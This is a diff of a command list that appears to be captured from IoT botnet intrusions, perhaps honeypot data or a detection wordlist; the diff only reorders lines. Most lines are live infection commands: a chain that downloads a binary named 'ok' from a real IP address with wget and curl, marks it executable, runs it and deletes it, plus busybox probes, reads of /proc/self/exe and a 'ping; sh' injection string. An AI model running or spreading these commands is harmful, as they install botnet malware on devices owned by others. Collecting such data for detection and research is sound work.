@@ -36,13 +36,12 @@ id
 &k`g&k|zpkfq)ES[M
 g & k | zpkfq
 /bin/./uname -s -v -n -r -m
+exit
 ping; sh
 uname -a
-/bin/busybox cat /proc/self/exe || cat /proc/self/exe
-exit
 (cd /tmp; wget http://5.182.210.174/ok; curl -O http://5.182.210.174/ok; chmod +x ok; sh ok; rm -rf ok; rm -rf ok.1) >/dev/null 2>&1 &
 ./ok
-/bin/busybox TOKEN
+/bin/busybox cat /proc/self/exe || cat /proc/self/exe
 /userfs/bin/wget http://5.182.210.174/ok
 busybox curl -O http://5.182.210.174/ok
 busybox sh ok
@@ -53,6 +52,7 @@ chmod +x ok
 chmod 777 ok
 rm -rf ok
 rm -rf ok.1
+/bin/busybox TOKEN
 za
 zalee
 echo SHELL_TEST
